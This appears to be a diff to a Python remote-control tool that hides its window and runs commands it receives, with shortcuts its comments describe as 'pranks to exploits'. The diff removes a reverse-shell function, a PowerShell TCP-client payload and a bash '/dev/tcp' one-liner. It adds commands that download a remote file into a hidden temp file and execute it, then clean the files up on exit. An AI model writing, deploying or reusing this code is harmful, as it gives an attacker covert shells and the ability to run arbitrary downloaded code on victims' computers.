@@ -11,12 +11,35 @@ from subprocess import run as shell
 # For enabling debug and exiting
 from sys import argv
 from sys import exit as bye
-# Filesystem stuff
-from os.path import exists as fileExists
 # Get host OS
-from platform import system as os
+from platform import system
 # For RegExp, unfortunately
 from re import search
+# For getting files
+import requests
+# For hiding files
+from tempfile import mkstemp
+# For deleting temporary files
+from os import remove as rm
+
+# Store any temporary files that were downloaded
+files = {}
+
+
+# curl <url> <fileID>
+def curl(*args):
+    data = requests.get(args[0])
+    file = mkstemp()
+    files[args[1]] = file
+    with open(file[0], "wb") as openedFile:
+        openedFile.write(data.content)
+
+
+# file <fileID> [run]
+def file_handler(*args):
+    file = files[args[0]]
+    if args[1] == "run":
+        shell(file[1])
 
 
 class App(Tk):
@@ -25,7 +48,7 @@ class App(Tk):
     """
     def __init__(self):
         # Store host OS
-        self.os = os()
+        self.os = system()
         # Whether the app should be visible
         self.visible = False
         # If there should be extra output
@@ -78,24 +101,6 @@ class App(Tk):
             # Make the window invisible
             self.attributes('-alpha', 0)
 
-        # Shortcut commands
-        # Reverse shell, coming soon(tm) :P
-        def revShell(*args):
-            # Windows' ridiculously long PowerShell script
-            if self.os == "Windows":
-                shell("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(" +
-                      f"{args[0]},{args[1]});$stream = $client.GetStream();" +
-                      "[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
-                      "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
-                      '$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";'
-                      "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
-                      "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
-                      shell=True,
-                      check=False)
-            # The much simpler Bash script for the fancy macOS/Linux bois *sips tea*
-            else:
-                shell(f"sh -i >& /dev/tcp/{args[0]}/{args[1]} 0>&1", shell=True, check=False)
-
         # Shortcut commands, ranging from pranks to exploits
         self.shortcuts = {
             # macOS shortcuts
@@ -108,13 +113,14 @@ class App(Tk):
                 'volume': 'osascript -e \'set Volume {args[0]}\'',
                 # Set the macOS volume to 0
                 'mute': 'osascript -e \'set Volume 0\'',
-                # Reverse shell (See above)
-                'shell': revShell,
             },
             # Windows shortcuts
             'Windows': {
-                # Reverse shell (See above)
-                'shell': revShell,
+            },
+            # Universal shortcuts (These are in Python, so they run anywhere)
+            'Universal': {
+                'curl': curl,
+                'file': file_handler,
             }
         }
 
@@ -174,7 +180,7 @@ class App(Tk):
         self.log(splitCommand[0])
 
         # If the command is a shortcut, run the shortcut
-        if splitCommand[0] in self.shortcuts[self.os]:
+        if splitCommand[0] in self.shortcuts[self.os] or splitCommand[0] in self.shortcuts["Universal"]:
             # Print that a shortcut was detected
             self.log("-> Shortcut detected! Running a shortcut instead.")
             # The shortcut
@@ -183,7 +189,7 @@ class App(Tk):
             if type(shortcut) == str:
                 shell(shortcut.format(args=splitCommand[1:]), shell=True, check=False)
             # If the shortcut is a function, run the python code
-            elif callable(shortcut):
+            else:
                 shortcut(splitCommand[1:])
         else:
             # Otherwise, run the command
@@ -205,6 +211,9 @@ class App(Tk):
         Quit the app and close any open terminals
         """
         self.log("Exiting...")
+        # Delete temporary files
+        for file in files.items():
+            rm(file[1])
         # macOS stuff
         if self.os == 'Darwin':
             # Kill all terminals
